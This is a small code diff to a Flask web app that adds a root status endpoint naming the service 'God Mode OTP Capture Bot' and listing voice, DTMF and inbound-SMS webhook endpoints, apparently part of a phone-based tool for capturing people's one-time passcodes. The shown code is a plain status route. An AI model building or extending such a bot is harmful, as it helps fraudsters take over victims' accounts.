@@ -657,6 +657,15 @@ def handle_uncaught_exception(error):
     logger.exception("Unhandled HTTP error")
     return jsonify({"error": "internal_server_error", "message": "An unexpected error occurred."}), 500
 
+@app.route("/")
+def index():
+    return jsonify({
+        "status": "online",
+        "service": "God Mode OTP Capture Bot",
+        "version": "4.1",
+        "endpoints": ["/health", "/dashboard", "/webhook/voice", "/webhook/dtmf", "/inbound-sms"]
+    })
+
 @app.route("/health")
 def health():
     try:
